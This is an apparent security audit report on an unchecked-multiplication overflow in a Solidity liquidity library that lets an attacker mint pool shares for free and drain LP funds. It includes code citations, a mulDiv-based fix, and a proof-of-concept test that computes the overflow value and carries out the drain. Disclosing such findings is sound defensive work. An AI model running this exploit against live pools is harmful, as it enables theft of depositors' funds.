Audit Report

## Title
Unchecked uint256 Overflow in `_checkedMul` Allows Free Share Minting and LP Fund Drain — (`metric-core/contracts/libraries/LiquidityLib.sol`)

## Summary
`_checkedMul` performs a bare `a * b` multiplication with no overflow protection, and is called inside the `unchecked {}` block of `addLiquidity`. An attacker can supply a `sharesToAdd` value that causes `token0BalanceScaled * sharesToAdd` to silently wrap to zero, minting a dominant share position without depositing any tokens. The attacker then drains legitimate LP funds via `removeLiquidity`.

## Finding Description
`_checkedMul` at [1](#0-0)  is literally `return a * b;` — the name is misleading; there is no checked arithmetic.

The entire `addLiquidity` body is wrapped in `unchecked {}` at [2](#0-1) , disabling Solidity 0.8's default overflow protection for all arithmetic within.

`BinState.token0BalanceScaled` is `uint104` (max ≈ 2^104) per [3](#0-2) , and `sharesToAdd` is a caller-supplied `uint256` with no upper bound — only a zero check (`if (sharesToAdd == 0) continue`) and a minimum check (`newUserShares < ctx.minimalMintableLiquidity`) are applied. [4](#0-3) 

The vulnerable multiplication at [5](#0-4)  computes `Math.ceilDiv(_checkedMul(binState.token0BalanceScaled, sharesToAdd), binTotalSharesVal)`. When the product overflows and wraps to a value less than `binTotalSharesVal`, `Math.ceilDiv` returns 0 or a negligible value.

Share and balance accounting then diverge: [6](#0-5) 
- `binState.token0BalanceScaled` is **not** incremented (guarded by `if (amount0Scaled > 0)`)
- `binTotalShares[binIdx]` **is** incremented by the full `sharesToAdd`
- `positionBinShares[posKey]` **is** set to the full `newUserShares`

The token-receipt guard at [7](#0-6)  is bypassed entirely because `amount0Added == 0` and `amount1Added == 0` — the callback is never invoked and no tokens are transferred.

`removeLiquidity` also runs inside `unchecked {}` and uses `_checkedMul` at [8](#0-7)  and [9](#0-8) , but the attacker can choose `sharesToRemove` to avoid overflow there, yielding a large fraction of the bin's real token balance.

## Impact Explanation
Direct loss of LP principal — Critical/High. A legitimate LP's `token0BalanceScaled` and `binTotals.scaledToken0` are drained by an attacker who paid zero tokens. The pool becomes insolvent: remaining LP claims exceed actual token holdings. The attack is repeatable across both token legs and all non-empty bins, and the pool has no recovery mechanism.

## Likelihood Explanation
High. `addLiquidity` is a public function callable by any address with no role restriction. `sharesToAdd` is a caller-supplied `uint256[]` with no cap. The only prerequisite is that a bin already has non-zero liquidity (`binTotalSharesVal > 0`), which is the normal operating state of any active pool. No privileged access, oracle manipulation, or non-standard token behaviour is required.

## Recommendation
Remove the `unchecked` wrapper from the share-amount computation, or replace `_checkedMul` calls with `Math.mulDiv` (already used in the `binTotalSharesVal == 0` branch at lines 94–106). Specifically:

```solidity
// Lines 109–110: replace with
amount0Scaled = Math.mulDiv(binState.token0BalanceScaled, sharesToAdd, binTotalSharesVal, Math.Rounding.Ceil);
amount1Scaled = Math.mulDiv(binState.token1BalanceScaled, sharesToAdd, binTotalSharesVal, Math.Rounding.Ceil);

// Lines 205–206: replace with
uint256 amount0Scaled = Math.mulDiv(binState.token0BalanceScaled, sharesToRemove, binTotalSharesVal);
uint256 amount1Scaled = Math.mulDiv(binState.token1BalanceScaled, sharesToRemove, binTotalSharesVal);
```

The `_checkedMul` helper should be removed or replaced with a true checked multiply that reverts on overflow.

## Proof of Concept
```solidity
function test_overflow_freeShareMint() public {
    // Step 1: Legitimate LP seeds the bin
    uint104 legitShares = 1_000_000;
    _doAddLiquidity(LEGIT_LP, DEFAULT_SALT, _createDelta(TARGET_BIN, legitShares));

    uint104 V = pool.getBinState(TARGET_BIN).token0BalanceScaled;

    // Step 2: Attacker computes overflow trigger
    uint256 sharesToAdd = type(uint256).max / uint256(V) + 1;

    // Step 3: Attacker adds liquidity — pays 0 tokens
    (uint256 a0, uint256 a1) = _doAddLiquidity(ATTACKER, ATTACKER_SALT, _createDelta(TARGET_BIN, sharesToAdd));
    assertEq(a0, 0);
    assertEq(a1, 0);

    // Step 4: Attacker removes half their shares, drains ~half the bin's real balance
    uint256 removeShares = sharesToAdd / 2;
    (uint256 r0,) = _doRemoveLiquidity(ATTACKER, ATTACKER_SALT, _createDelta(TARGET_BIN, removeShares));
    assertGt(r0, uint256(V) / 3);

    // Legitimate LP's claim is now undercollateralised
    (uint256 lp0,) = _doRemoveLiquidity(LEGIT_LP, DEFAULT_SALT, _createDelta(TARGET_BIN, legitShares));
    assertLt(lp0, uint256(V) / 2);
}
```

### Citations

**File:** metric-core/contracts/libraries/LiquidityLib.sol (L51-51)
```text
    unchecked {
```

**File:** metric-core/contracts/libraries/LiquidityLib.sol (L64-79)
```text
        uint256 sharesToAdd = deltas.shares[i];

        if (binIdx < ctx.lowestBin || binIdx > ctx.highestBin) revert IMetricOmmPoolActions.InvalidBinIndex(binIdx);
        if (sharesToAdd == 0) continue;

        {
          // safe because -128 <= LOWEST_BIN <= HIGHEST_BIN <= 127 (enforced by factory)
          // forge-lint: disable-next-line(unsafe-typecast)
          bytes32 posKey = _positionBinKey(owner, salt, int8(binIdx));
          uint256 binTotalSharesVal = binTotalShares[binIdx];
          uint256 userShares = positionBinShares[posKey];

          uint256 newUserShares = userShares + sharesToAdd;
          if (newUserShares < ctx.minimalMintableLiquidity) {
            revert IMetricOmmPoolActions.MinimalLiquidity(newUserShares, ctx.minimalMintableLiquidity);
          }
```

**File:** metric-core/contracts/libraries/LiquidityLib.sol (L109-110)
```text
            amount0Scaled = Math.ceilDiv(_checkedMul(binState.token0BalanceScaled, sharesToAdd), binTotalSharesVal);
            amount1Scaled = Math.ceilDiv(_checkedMul(binState.token1BalanceScaled, sharesToAdd), binTotalSharesVal);
```

**File:** metric-core/contracts/libraries/LiquidityLib.sol (L112-121)
```text
          if (amount0Scaled > 0) {
            totalToken0ToAddScaled += amount0Scaled;
            binState.token0BalanceScaled = (uint256(binState.token0BalanceScaled) + amount0Scaled).toUint104();
          }
          if (amount1Scaled > 0) {
            totalToken1ToAddScaled += amount1Scaled;
            binState.token1BalanceScaled = (uint256(binState.token1BalanceScaled) + amount1Scaled).toUint104();
          }
          binTotalShares[binIdx] = binTotalSharesVal + sharesToAdd;
          positionBinShares[posKey] = newUserShares;
```

**File:** metric-core/contracts/libraries/LiquidityLib.sol (L144-154)
```text
      if (amount0Added > 0 || amount1Added > 0) {
        uint256 balance0Before = IERC20(ctx.token0).balanceOf(address(this));
        uint256 balance1Before = IERC20(ctx.token1).balanceOf(address(this));
        IMetricOmmModifyLiquidityCallback(msg.sender)
          .metricOmmModifyLiquidityCallback(amount0Added, amount1Added, callbackData);
        if (amount0Added > 0 && balance0Before + amount0Added > IERC20(ctx.token0).balanceOf(address(this))) {
          revert IMetricOmmPoolActions.InsufficientTokenBalance();
        }
        if (amount1Added > 0 && balance1Before + amount1Added > IERC20(ctx.token1).balanceOf(address(this))) {
          revert IMetricOmmPoolActions.InsufficientTokenBalance();
        }
```

**File:** metric-core/contracts/libraries/LiquidityLib.sol (L171-171)
```text
    unchecked {
```

**File:** metric-core/contracts/libraries/LiquidityLib.sol (L205-206)
```text
          uint256 amount0Scaled = _checkedMul(binState.token0BalanceScaled, sharesToRemove) / binTotalSharesVal;
          uint256 amount1Scaled = _checkedMul(binState.token1BalanceScaled, sharesToRemove) / binTotalSharesVal;
```

**File:** metric-core/contracts/libraries/LiquidityLib.sol (L261-263)
```text
  function _checkedMul(uint256 a, uint256 b) internal pure returns (uint256) {
    return a * b;
  }
```

**File:** metric-core/contracts/types/PoolStorage.sol (L20-21)
```text
  uint104 token0BalanceScaled;
  uint104 token1BalanceScaled;
```
